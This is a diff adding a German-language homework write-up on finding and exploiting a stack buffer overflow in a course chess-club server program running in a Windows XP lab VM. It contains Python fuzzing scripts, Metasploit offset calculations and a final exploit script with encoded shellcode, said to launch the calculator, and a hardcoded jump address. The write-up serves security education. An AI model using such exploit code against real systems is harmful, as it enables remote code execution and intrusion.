@@ -22,7 +22,7 @@
 		- [Vorbereitung und Setup](#)
 		- [Analyse](#)
 		- [Skript und Proof of Concept](#)
-
+		- 
 
 # 1. OSINT Reconnaissance
 
@@ -1062,4 +1062,365 @@ Ein Testdurchlauf zeigt, dass das Skript funktioniert. Zuerst wird das neue Prog
 Anschließend wird das Urprogramm erneut in der Kali-VM ausgeführt. Derselbe Nutzername und das generierte Passwort führen zu einem erfolgreichen Login:
 
 ![alt text](https://i.imgur.com/6R8VUto.png "Logo Title Text XXX")
+
+# 5. Buffer Overflow
+
+Im letzten Punkt der Hausübung soll ein Zero-Day Exploit Vulnerabilty gefunden und ausgenützt werden. Spoiler: Es handelt sich um einen stackbasierten Buffer Overflow.
+
+Dazu wird das Programm "schach_04.exe" im IDA-Pro Debugger der Windows XP VM ausgeführt. Die Verbindung erfolgt erneut über einen Terminal auf dem Host-OS (Mac Os), beziehungsweise über die IDE PyCharm, ebenfalls auf dem Host-OS ausgeführt. Kommandos, welche Output aus z.B. dem Metasploit-Framework erfordern, werden in einer Kali (32b) VM generiert und in das Host System übernommen.
+
+## Informationen über das Programm sammeln
+Zunächst wird das Schachprogramm auf die beabsichtigte Art und Weise verwendet. Dazu wird es in der Windows VM mit dem Argument "8888" gestartet und ist somit unter der IP des Gast-OS (192.168.56.101) sowie dem Port 8888 erreichbar.
+
+Eine erste Verbindung über den Terminal klappt problemlos:
+
+```
+Daves-MBP:~ Dave$ telnet 192.168.56.101 8888
+Trying 192.168.56.101...
+Connected to 192.168.56.101.
+Escape character is '^]'.
+                                                                                        
+    #     #####  #     # #######    ###                                 
+   # #   #     # ##   ## #           #  #    #  ####                    
+  #   #  #       # # # # #           #  ##   # #    #                   
+ #     # #       #  #  # #####       #  # #  # #                        
+ ####### #       #     # #           #  #  # # #                        
+ #     # #     # #     # #           #  #   ## #    #  ##               
+ #     #  #####  #     # #######    ### #    #  ####   ##               
+                                                                        
+                                                                        
+  #####                                                                 
+ #     #  ####  #    #   ##    ####  #    #  ####  #      #    # #####  
+ #       #    # #    #  #  #  #    # #    # #    # #      #    # #    # 
+  #####  #      ###### #    # #      ###### #      #      #    # #####  
+       # #      #    # ###### #      #    # #      #      #    # #    # 
+ #     # #    # #    # #    # #    # #    # #    # #      #    # #    # 
+  #####   ####  #    # #    #  ####  #    #  ####  ######  ####  #####  
+	
+> 
+.-------------------------------------------.
+|  ?,h      help                            |
+|  q        exit                            |
++----- Spieler -----------------------------+
+|  S        neuer Vereinsspieler            |
+|  L        Liste aller Spieler             |
+|  P[id]    Punkte eines Spielers           |
+|  C[id]    Punkte eines Spielers ändern    |
+|  d[id]    Lösche Spieler                  |
+|  V[id]    Ändere Spieler                  |
++----- Tunier ------------------------------+
+|  T        Tuniere anzeigen                |
+|  N        neues Tunier anlegen            |
+|  X[id]    Tunier löschen                  |
+`-------------------------------------------´
+```
+
+
+### Inputmöglichkeiten finden
+Nun gilt es verschiedene Möglichkeiten für die Eingabe von Userinput zu finden. Erst wenn diese gefunden sind, kann ein entsprechendes Fuzzing Script geschrieben werden. Nach kurzem Überprüfen der Punkte, die im Hilfsmenü ausgewiesen werden, zeigt sich, dass folgende Punkte zu Eingabeaufforderungen führen:
+
+* S
+* V1
+* C1
+* N
+
+## Fuzzing
+### Runde 1
+Entsprechend der soeben erhaltenen Erkenntnisse wird nun eine erste Version des Fuzzing-Scripts ausgearbeitet. Beim Fuzzing wird mit Hilfe eines Programms Input erzeugt und in das Zielprogramm eingegeben, um zu sehen, ob bei bestimmtem Input Fehler auftreten. Fürs Erste spielt lediglich die Größe des Inputs eine Rolle, da wir herausfinden wollen, ob sehr hohe Inputmengen unerwartetes Verhalten auslösen.
+
+Daher wird bei dieser ersten Variante ein simpler Buffer von 50 "A"s (Hexadezimal: '\41') erzeugt. Dieser wird für jede der möglichen Input-Varianten eingespielt und anschließend um 50 weitere "A"s erhöht und erneut eingespielt. Das Skript liefert Output, wenn es zu einem Crash im Zielprogramm kommt und informiert über die Buffergröße, sowie den soeben verwendeten Befehl.
+
+Hier ist die erste Version des Skripts:
+
+~~~python
+import time, telnetlib
+
+buffer = '\x41' * 50
+buffer_orig = buffer
+
+IP = '192.168.56.101'
+PORT = 8888
+BUFFER_SIZE = 1024
+MESSAGE = "?"
+commands = ['S', 'V1', 'C1', 'N']
+active_command = commands[0]
+
+conn = telnetlib.Telnet(IP, PORT)
+print(conn.read_until('>', timeout=5))
+
+try:
+    for command in commands:
+        e_count = 0
+
+        ''' check if command is a new command, if yes: 
+        reset the buffer to it's original size'''
+        if active_command is not command:
+            buffer = buffer_orig
+            active_command = command
+
+        ''' 
+        If the buffer gets bigger than 1500 characters, 
+        continue to next iteration of for-loop
+        '''
+        while len(buffer) < 1501:
+
+            print('Trying command {} with length {}'.format(command, len(buffer)))
+
+            conn.write(command + '\r\n')
+
+            # V1 requires another step to get to the input prompt:
+            if command == 'V1':
+                resp = conn.read_until('>', timeout=1)
+                print (resp)
+                conn.write('N\r\n')
+                resp = conn.read_until(':', timeout=1)
+                print (resp)
+                conn.write(buffer + '\r\n')
+                resp = conn.read_until('>', timeout=1)
+                print (resp)
+                conn.write("r\r\n")
+                resp = conn.read_until('>', timeout=1)
+                print (resp)
+                buffer = buffer + buffer_orig
+                continue
+            # Read until colon, b.c. it signifies an input prompt
+            else:
+                resp = conn.read_until(':', timeout=1)
+            # If response doesn't contain a specified input prompt
+            while ':' not in resp:
+                e_count += 1
+
+                print "Counted errors: {}\r\n".format(e_count)
+
+                time.sleep(1)
+
+                print command + '\r\n'
+                conn.write(command + '\r\n')
+                response = conn.read_until(":", timeout=1)
+                print response
+                if e_count == 5:
+                    break
+            if e_count == 5:
+                break
+            while ':' in resp:
+                conn.write(buffer + '\r\n')
+                resp = conn.read_until(':', timeout=0.1)
+                print (resp)
+
+            print conn.read_until(">", timeout=5)
+            e_count = 0
+
+            # increase the buffer by its original size
+            buffer = buffer + buffer_orig
+
+except:
+    print('Crash ocurred at buffer size: ' + str(len(buffer)))
+
+conn.close()
+~~~
+
+Das Fuzzerskript benutzt dabei Telnet um einerseits die Inputs an das Zielprogramm zu schicken und andererseits den Output des Zielprogramms zu lesen und entsprechend reagieren zu können.
+
+Als Höchstwert wurde für die ersten Tests ein Buffer von 1500 Zeichen festgelegt. Kommt es bei dieser Länge noch immer zu keine Crash, so wird zum nächsten Kommando übergegangen.
+
+Im Test stellt sich bald heraus, dass es unter dem V1 Kommando wohl zu Problemen kommt, zwischen einer Bufferlänge von 550 und 650 Zeichen kommt keine weitere Rückmeldung vom Zielprogramm.
+
+![alt text](https://i.imgur.com/3lLqysa.png "Logo Title Text XXX")
+
+IDA Pro zeigt an, dass eine Access Violation stattgefunden hat. Das Programm ist also in der Tat gecrasht.
+
+![alt text](https://i.imgur.com/vyILTOa.png "Logo Title Text XXX")
+
+
+Ein Blick auf die Register zeigt, dass die Register EAX, ECX und EDX alle mit "A"s überschrieben wurden.
+
+![alt text](https://i.imgur.com/r02qqHo.png "Logo Title Text XXX")
+
+Für uns ist aber momentan in erster Linie der EIP interessant, der Instruction Pointer. Wenn wir diesen unter Kontrolle bringen können wir in den weiteren Verlauf des Programms eingreifen.
+
+### Runde 2
+
+Nun, da das Zielkommando bekannt ist, kann das Skript entsprechend adaptiert werden.
+
+Da auch bereits die ungefähre Länge bekannt ist, ab der es zum Bufferüberlauf kommt, wird nun mit dem Metasploit-Framework ein sich nicht wiederholendes Muster erzeugt, welches diese Länge abdeckt. Als Richtwert werden 700 Zeichen gewählt:
+```
+root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
+```
+
+Das resultierende Muster wird nun als einmaliger Buffer eingespielt. Da ja auch bereits das Zielkommando bekannt ist, wird das Fuzzer Skript dahingehend adaptiert. Also wird der Buffer verändert:
+
+~~~python
+# buffer = '\x41' * 50
+buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"
+buffer_orig = buffer
+~~~
+
+Und das Kommando:
+
+~~~python
+# commands = ['S', 'V1', 'C1', 'N']
+commands = ['V1']
+~~~
+
+
+Bei einem erneuten Durchlauf mit diesem Input zeigt sich, dass im EIP Register eine neue Zeichenfolge aufscheint. Diese Zeichenfolge taucht im eingespielten Muster nur einmal auf. Daher kann mittels dieser die exakte Inputlänge ermittelt werden, die benötigt wird um den EIP zu überschreiben.
+
+![alt text](https://i.imgur.com/nZcyfdc.png "Logo Title Text XXX")
+![alt text](https://i.imgur.com/YJP6s7M.png "Logo Title Text XXX")
+
+Der Wert von interesse ist 74413474. Dort hat der Crash stattgefunden. Mit dem folgenden Kommando wird in dem Zuvor erzeugten Muster nach dem Exakten Offset für den Wert gesucht.
+
+```
+root@kali:~# /usr/share/metasploit-framework/tools/exploit/
+pattern_offset.rb -q 74413474
+[*] Exact match at offset 583
+```
+583 ist also die tatsächliche Buffergröße, bei der es zum Crash kommt. Mit diesem Wissen geht es in die nächste Runde mit dem Fuzzer-Script.
+
+
+### Runde 3
+Jetzt kann getestet werden, ob der EIP tatsächlich mit einem klar definierten Input überschrieben werden kann. Dazu wird der Inputstring des Fuzzing-Scripts erneut adaptiert. Und zwar wird dieses Mal ein Muster mit exakt 583 Zeichen erzeugt. Dieses ersetzt nun einfach die Eingabe des letzten Fuzzing Durchgangs:
+
+~~~python
+#max_offset = 583
+buffer = "﻿Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3A"
+buffer_orig = buffer
+~~~
+
+Der EIP ist nun mit diesem Wert überschrieben:
+
+![alt text](https://i.imgur.com/Teexxix.png "Logo Title Text XXX")
+
+Ich lasse mir das Offset dieses Werts berechnen und erhalte:
+
+```
+root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41337441
+[*] Exact match at offset 579
+```
+
+Wenn es zu einem Buffer Overflow kommt wird der EIP zwischen einem Offset von 579 und 583 Bytes überschrieben. Das Register hat eine Größe von 4 Bytes... klingt einleuchtend.
+
+Bei dieser Gelegenheit werden auch gleich noch die Werte der anderen Register auf ihre Offsets überprüft. Sie liegen alle schön hintereinander. Am Ende ergibt sich folgende Aufstellung für die beginnenden Offsets aller Register, die ich überschreiben kann:
+
+```
+# EBX 41397341 567 -> B
+# EDI 74413074 571 -> C
+# EBP 32744131 575 -> D
+# EIP 41337441 579 -> E
+```
+
+### Runde 4
+
+Natürlich machen wir die Probe aufs Exempel und versuchen nun noch einmal unsere eigenen Werte einzuschleußen. Schließlich wollen wir ja sehen, ob wir den EIP mit beliebigen Werten überschreiben können.
+
+In der obigen Box sieht man auch bereits, welche Werte genommen wurden. EBX soll idealerweise mit B, EDI mit C, EBP mit D und der EIP mit E überschrieben werden.
+
+~~~python
+min_offset = 567
+max_offset = 583
+buffer = "\x41"*min_offset+"\x42"*4+"\x43"*4+"\x44"*4+"\x45"*4
+buffer_orig = buffer
+~~~
+
+![alt text](https://i.imgur.com/x703KdC.png "Logo Title Text XXX")
+
+Treffer! Der EIP ist mit "E"'s überschrieben!
+
+Mit diesem Wissenstand kann der EIP nun mit einer dazu gebracht werden, auf einen Punkt im Programmverlauf zu zeigen, der uns genehm ist.
+
+
+
+### Der Angriff
+
+Im nächsten Schritt wurde nun ein weiteres Skript erzeugt, welches den Angriff auf das Zielprogramm ausführt. Das Ziel ist den Buffer-Overflow zu erzeugen und das Programm zur Ausführung eines Shellskripts zu bringen, welches den Windows Taschenrechner öffnet.
+
+
+Im Angriffskript wird nun der Input so eingespielt, dass der EIP mit einer JMP-Instruktion, also einem Sprung zu einer deutlich früheren Memory-Adresse überschrieben wird. Diese Adresse liegt innerhalb des Bereichs unseres Buffers und ist zunächst mit NOPs (= No operations, Hex: x90) gefüllt. Diese werden einfach durchiteriert ohne dass etwas passiert, bis unser Schadcode zur Ausführung kommt.
+
+
+### Das peinliche Ende
+
+An dieser Stelle muss ich leider anmerken, dass ich die restlichen Details dieses speziellen Buffer Overflow auch nach mittlerweile 12 Tagen, die ich mich damit beschäftige, nicht wirklich begreife. 
+
+Ich habe bis zuletzt gehofft, dass mir noch ein Licht aufgeht, aber jetzt ist es 20 Min vor der Deadline und es will einfach nichts werden.
+
+
+Assembler ist einfach zu verwirrend für mich. Ich habe mit einigen Kollegen an einer Lösung gearbeitet, mein Skript ist im folgenden abgebildet. Es schafft die Ausführung des Taschenrechners, allerdings nicht in 100% der Fälle. Offenbar fehlt ein dynamischer Aspekt in meinem Skript, aber ich begreife einfach nicht, wo es hapert.
+
+Ich hatte vor dieser LV nie mit C oder ASM zu tun und bin schon auf das Erreichte stolz...
+
+
+~~~python
+import socket
+
+# EBX 41397341 567
+# EBP 32744131 575
+# EIP 41337441 579
+
+shellcode = ""
+shellcode += "\xdb\xc8\xd9\x74\x24\xf4\x58\x33\xc9\xbb\xf7\xe7"
+shellcode += "\x49\x5b\xb1\x31\x83\xe8\xfc\x31\x58\x14\x03\x58"
+shellcode += "\xe3\x05\xbc\xa7\xe3\x48\x3f\x58\xf3\x2c\xc9\xbd"
+shellcode += "\xc2\x6c\xad\xb6\x74\x5d\xa5\x9b\x78\x16\xeb\x0f"
+shellcode += "\x0b\x5a\x24\x3f\xbc\xd1\x12\x0e\x3d\x49\x66\x11"
+shellcode += "\xbd\x90\xbb\xf1\xfc\x5a\xce\xf0\x39\x86\x23\xa0"
+shellcode += "\x92\xcc\x96\x55\x97\x99\x2a\xdd\xeb\x0c\x2b\x02"
+shellcode += "\xbb\x2f\x1a\x95\xb0\x69\xbc\x17\x15\x02\xf5\x0f"
+shellcode += "\x7a\x2f\x4f\xbb\x48\xdb\x4e\x6d\x81\x24\xfc\x50"
+shellcode += "\x2e\xd7\xfc\x95\x88\x08\x8b\xef\xeb\xb5\x8c\x2b"
+shellcode += "\x96\x61\x18\xa8\x30\xe1\xba\x14\xc1\x26\x5c\xde"
+shellcode += "\xcd\x83\x2a\xb8\xd1\x12\xfe\xb2\xed\x9f\x01\x15"
+shellcode += "\x64\xdb\x25\xb1\x2d\xbf\x44\xe0\x8b\x6e\x78\xf2"
+shellcode += "\x74\xce\xdc\x78\x98\x1b\x6d\x23\xf6\xda\xe3\x59"
+shellcode += "\xb4\xdd\xfb\x61\xe8\xb5\xca\xea\x67\xc1\xd2\x38"
+shellcode += "\xcc\x3d\x99\x61\x64\xd6\x44\xf0\x35\xbb\x76\x2e"
+shellcode += "\x79\xc2\xf4\xdb\x01\x31\xe4\xa9\x04\x7d\xa2\x42"
+shellcode += "\x74\xee\x47\x65\x2b\x0f\x42\x06\xaa\x83\x0e\xe7"
+shellcode += "\x49\x24\xb4\xf7"
+
+max_offset = 583
+min_offset = 567
+start_eip = 579
+
+# 0 - Beginning_EBX -> A
+# EBX 41397341 567 -> B
+# EDI 74413074 571 -> C
+# EBP 32744131 575 -> D
+# EIP 41337441 579 -> E
+
+# bufferarray = ["\x41"*min_offset+"\x42"*4+"\x43"*4+"\x44"*4+"\x8D\x84\x24\xBC\xFD\xFF\xFF\x89\xC4"]
+lea_9 = "\x8D\x84\x24\xBC\xFD\xFF\xFF\x89\xC4"
+
+nop_slide = "\x90"*101
+filler_a = "\x41"*(start_eip - len(shellcode) - len(lea_9) - len(nop_slide))
+
+buffer = nop_slide + lea_9 + shellcode + filler_a + "\x14\xFC\x22\x00"
+
+print(len(buffer))
+
+TCP_IP = '192.168.56.101'
+TCP_PORT = 8888
+BUFFER_SIZE = 1024
+MESSAGE = "?"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+
+s.send('V1\r\n')
+data = s.recv(BUFFER_SIZE)
+print "received data:", data
+
+s.send('N\r\n')
+data = s.recv(BUFFER_SIZE)
+print "received data:", data
+
+s.send(buffer + '\r\n')
+data = s.recv(BUFFER_SIZE)
+print "received data:", data
+
+s.close()
+
+print "received data:", data
+
+~~~
 
